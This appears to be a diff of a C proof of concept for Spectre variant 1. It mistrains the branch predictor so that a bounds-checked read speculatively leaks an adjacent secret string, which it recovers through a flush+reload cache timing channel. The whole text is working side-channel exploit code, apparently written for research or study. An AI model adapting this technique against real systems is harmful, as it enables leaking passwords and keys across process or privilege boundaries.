@@ -6,59 +6,62 @@
 #include "../lib/print_results.c"
 
 #define N_PAGES 256
-#define REPETITIONS 100
+#define REPETITIONS 10
+#define N_TRAINING 10
 #define CACHE_HIT 100
 #define MAYBE_CACHE_HIT 175
-#define SECRET_SIZE 25
-//TODO: secret in separate, adjacent string
-#define DATA "notasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretzhis is a secret message"
+#define SECRET_SIZE 9
+#define SECRET "mysecret"
+#define DATA "public"
+int DATA_SIZE __attribute__ ((aligned (256))) = 7;
 
-int accessible __attribute__ ((aligned (256))) = 100;
+cp_t* flush_reload_arr __attribute__ ((aligned (256)));
+
 
 /*
  * Variables required in cache:
  *  index
  *  data
- *  arr^(1)
  *
  * Variables requried in mem:
- *  accessible
+ *  DATA_SIZE
  *
- *  ^(1): when arr is in mem the gadget still works, but the accuracy goes down.
- *        I currently do not know why, but I suspect it makes the loading of arr[x] take longer.
  */
-void victim_func(int index, cp_t* arr, unsigned char* data) {
+void victim_func(int secret_index) {
 
     //flush bound value
-    flush((void*)&accessible);
-    flush((void*)&arr);
+    flush((void*)&DATA_SIZE);
     cpuid();
 
     //access (possibly out of bounds)
-    if (index < accessible) {
-        unsigned char x = data[index];
-        volatile cp_t cp = arr[x];
+    if (secret_index < DATA_SIZE) {
+        unsigned char x = DATA[secret_index];
+        volatile cp_t cp = flush_reload_arr[x];
     }
 }
 
-int* prepare(int index) {
+int* prepare(int secret_index) {
 
-    cp_t* flush_reload_arr = init_flush_reload(N_PAGES);
-    flush_arr((void*)flush_reload_arr, N_PAGES);
+    flush_reload_arr = init_flush_reload(N_PAGES);
+    flush_arr(flush_reload_arr, N_PAGES);
 
     //access decisions in array, repeated out-of-bounds not traceable for branch predictor
-    int n_accesses = accessible-10 + 1; //NOTE: when n_accesses is accessble+1, then 'z' never gets a cache hit.
+    int n_accesses = N_TRAINING + 1;
     int accesses[n_accesses];
-    for(int i = 0; i < n_accesses; i++) accesses[i] = i;
-    accesses[n_accesses-1] = index;
+    for(int i = 0; i < n_accesses; i++) accesses[i] = 0;
+    accesses[n_accesses-1] = secret_index;
 
     //Misstrain branch predictor, access out of bounds on last call
     for(int i = 0; i < n_accesses; i++) {
-        victim_func(accesses[i], flush_reload_arr, DATA);
+        victim_func(accesses[i]);
 
-        //ensures completion before flushing. bar prevents speculative access from being flushed
         cpuid();
-        flush((void*)&flush_reload_arr[DATA[i]]);    //TODO: make this sensible
+        //flush hits from training phase (all but last access)
+        if(i < n_accesses-1) {
+            cpuid();
+
+            flush_arr(flush_reload_arr, N_PAGES);
+        }
         cpuid();
     }
 
@@ -75,12 +78,14 @@ int* prepare(int index) {
 
 int main(int argc, char* argv[]) {
 
+    printf("SECRET \t%p\tsize = %d\nDATA \t%p\tsize = %d\n", &SECRET, SECRET_SIZE, &DATA, DATA_SIZE);
+
     int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints
 
     for(int r = 0; r < REPETITIONS; r++) {
 
         for (int s = 0; s < SECRET_SIZE; s++) {
-            results[r][s] = prepare(accessible + s);
+            results[r][s] = prepare(DATA_SIZE + s);
             cpuid();
         }
     }
